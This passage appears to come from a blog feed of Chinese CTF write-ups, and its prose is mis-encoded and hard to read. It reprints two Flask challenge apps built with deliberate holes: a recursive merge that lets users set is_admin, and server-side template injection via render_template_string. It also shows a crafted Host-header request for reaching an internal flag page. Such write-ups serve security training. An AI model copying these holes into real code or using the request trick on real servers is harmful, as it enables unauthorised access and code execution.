class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, session, request, redirect, url_for, render_template, render_template_string, jsonify</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> waf, key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®SECRET_KEY</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;ctfshow5201314&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_COOKIE_NAME&#x27;</span>] = <span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;&#125;</span><br><span class="line"></span><br><span class="line">valid_urls = [<span class="string">&#x27;/logout&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;/echo&#x27;</span>, <span class="string">&#x27;/secret&#x27;</span>, <span class="string">&#x27;/register&#x27;</span>, <span class="string">&#x27;/login&#x27;</span>, <span class="string">&#x27;/chat&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTFer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line">        <span class="variable language_">self</span>.is_admin = <span class="number">0</span>  <span class="comment"># ä¹Ÿå¯ä»¥è®¾ç½®é»˜è®¤çš„ is_admin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è£…é¥°å™¨ç”¨äºéªŒè¯ URL</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">require_valid_url</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.path <span class="keyword">not</span> <span class="keyword">in</span> valid_urls:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Access denied&quot;</span>&#125;), <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> f(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    wrapper.__name__ = f.__name__  <span class="comment"># ä¿æŒè§†å›¾å‡½æ•°åç§°</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], echo_message=session.get(<span class="string">&#x27;echo_message&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, echo_message=session.get(<span class="string">&#x27;echo_message&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.is_json:  <span class="comment"># å¤„ç† JSON è¯·æ±‚</span></span><br><span class="line">            username = request.json.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">            password = request.json.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Username already exists&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            ctfer = CTFer(username, password)</span><br><span class="line">            merge(request.json, ctfer)</span><br><span class="line">            users[ctfer.username] = &#123;<span class="string">&#x27;password&#x27;</span>: ctfer.password, <span class="string">&#x27;is_admin&#x27;</span>: ctfer.is_admin&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Yeah~ You succeeded!&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¤„ç†è¡¨å•è¯·æ±‚</span></span><br><span class="line">        data = request.form.to_dict(flat=<span class="literal">False</span>)</span><br><span class="line">        username = data.get(<span class="string">&#x27;username&#x27;</span>, [<span class="string">&#x27;&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">        password = data.get(<span class="string">&#x27;password&#x27;</span>, [<span class="string">&#x27;&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Username already exists&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;is_admin&#x27;</span>] = users[username][<span class="string">&#x27;is_admin&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid credentials&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;is_admin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/chat&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chat</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;chat.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;is_admin&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            secret_content = file.read()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;secret.html&#x27;</span>, secret_content=secret_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;access_denied.html&#x27;</span>), <span class="number">403</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/echo&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>():</span><br><span class="line">    message = request.form.get(<span class="string">&#x27;message&#x27;</span>)</span><br><span class="line">    session[<span class="string">&#x27;echo_message&#x27;</span>] = message</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;is_admin&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> key(message):</span><br><span class="line">            <span class="keyword">if</span> waf(message):</span><br><span class="line">                template = <span class="string">&#x27;your answer is &#123;&#123;%s&#125;&#125;&#x27;</span> % session[<span class="string">&#x27;echo_message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    render_template_string(template)</span><br><span class="line">                    session[<span class="string">&#x27;echo_message&#x27;</span>] = render_template_string(template)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    abort(<span class="number">404</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;echo_message&#x27;</span>] = <span class="string">&#x27;You can bypass it!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h2 id="è¿·é›¾é‡é‡"><a href="#è¿·é›¾é‡é‡" class="headerlink" title="è¿·é›¾é‡é‡"></a>è¿·é›¾é‡é‡</h2><p>phpçš„é¢˜ç›®ä¸æ˜¯è®­ç»ƒçš„é‡ç‚¹ï¼Œä¸æƒ³å†™</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sstié•¿åº¦é™åˆ¶ </tag>
            
            <tag> flaskåŸå‹é“¾æ±¡æŸ“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024èœ€é“å±±</title>
      <link href="/2025/11/28/2024%E8%9C%80%E9%81%93%E5%B1%B1/"/>
      <url>/2025/11/28/2024%E8%9C%80%E9%81%93%E5%B1%B1/</url>
      
        <content type="html"><![CDATA[<p>ç›´æ¥å¼€æ‰“</p><h2 id="æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°"><a href="#æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°" class="headerlink" title="æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°"></a>æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°</h2><p>hint:</p><p>è¿™æ˜¯ä¸€ä¸ªæµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°ï¼Œä½ çš„ä»»åŠ¡æ˜¯åˆ¤æ–­æ‰€ç»™å›¾ç‰‡èƒ½å¦è¿›å…¥å¢ƒå†…ï¼Œä½†æ˜¯å…¨éƒ¨åˆ¤æ–­æ­£ç¡®çš„æˆåŠŸé¡µé¢å¥½åƒä¸¢å¤±äº†ï¼Ÿï¼Ÿflagåœ¨å†…ç½‘çš„<a href="http://infernityhost/flag.html">http://infernityhost/flag.html</a></p><p>ç½‘é¡µæºç æ‹¿&#x2F;errorè·¯ç”±ï¼Œç›´æ¥è®¿é—®æœ‰é‡å®šå‘ï¼ŒæŠ“åŒ…å‘ç°nginx&#x2F;1.17.6ï¼Œä¸Šç½‘æ‰¾åˆ°</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/null1433/p/12778026.html</span><br></pre></td></tr></table></figure><p>è¯·æ±‚èµ°ç§ï¼Œæ”¹ä¸‹host</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.htm; HTTP/1.1</span><br><span class="line">Host: inferbityhost</span><br></pre></td></tr></table></figure><h2 id="my-site"><a href="#my-site" class="headerlink" title="my_site"></a>my_site</h2><p>ç»™å‡ºæºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, render_template_string, request, render_template, redirect, url_for, session, flash, g</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> rot13, key</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;your_secret_key&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;DATABASE&#x27;</span>] = <span class="string">&#x27;database.db&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_db</span>():</span><br><span class="line">    db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(app.config[<span class="string">&#x27;DATABASE&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close_connection</span>(<span class="params">exception</span>):</span><br><span class="line">    db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;home.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rot13&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13_route</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        action = request.form[<span class="string">&#x27;action&#x27;</span>]</span><br><span class="line">        text = request.form[<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">            encrypted_text = rot13(text)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=encrypted_text, action=<span class="string">&#x27;encrypt&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> action == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">            text = request.form[<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">            decrypted_text = rot13(text)</span><br><span class="line">            <span class="keyword">if</span> key(decrypted_text):</span><br><span class="line">                template = <span class="string">&#x27;&lt;h1&gt;Your decrypted text is: &#123;&#123;%s&#125;&#125;&lt;/h1&gt;&#x27;</span> % decrypted_text</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    render_template_string(template)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    abort(<span class="number">404</span>)</span><br><span class="line">                <span class="comment"># return &quot;æ—¢ç„¶ä½ æ˜¯é»‘é˜”ï¼Œé‚£æˆ‘å‡­ä»€ä¹ˆç»™ä½ å›æ˜¾&quot;</span></span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=<span class="string">&quot;æ—¢ç„¶ä½ æ˜¯é»‘é˜”ï¼Œé‚£æˆ‘å‡­ä»€ä¹ˆç»™ä½ å›æ˜¾&quot;</span>, action=<span class="string">&#x27;decrypt&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=decrypted_text, action=<span class="string">&#x27;decrypt&#x27;</span>))</span><br><span class="line">                template = <span class="string">&#x27;&lt;h1&gt;Your decrypted text is: %s&lt;/h1&gt;&#x27;</span> % decrypted_text</span><br><span class="line">                <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rot13_result/&lt;action&gt;/&lt;result&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13_result</span>(<span class="params">action, result</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;rot13_result.html&#x27;</span>, action=action, result=result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        db = get_db()</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password))</span><br><span class="line">        user = cursor.fetchone()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;message_board&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        db = get_db()</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;</span>, (username, password))</span><br><span class="line">            db.commit()</span><br><span class="line">            flash(<span class="string">&#x27;Registration successful! Please log in.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/message_board&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message_board</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    db = get_db()</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">        cursor.execute(<span class="string">&quot;INSERT INTO messages (username, message) VALUES (?, ?)&quot;</span>, (session[<span class="string">&#x27;username&#x27;</span>], message))</span><br><span class="line">        db.commit()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">&quot;SELECT username, message FROM messages&quot;</span>)</span><br><span class="line">    messages = cursor.fetchall()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;message_board.html&#x27;</span>, messages=messages)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/11/image-20251128165447668.png" alt="image-20251128165447668"></p><p>&#x2F;rot13è·¯ç”±å­˜åœ¨sstiï¼Œè¯•å‡ºconfigå¯ä»¥è¿›å…¥ifï¼Œè€Œä¸”æ— 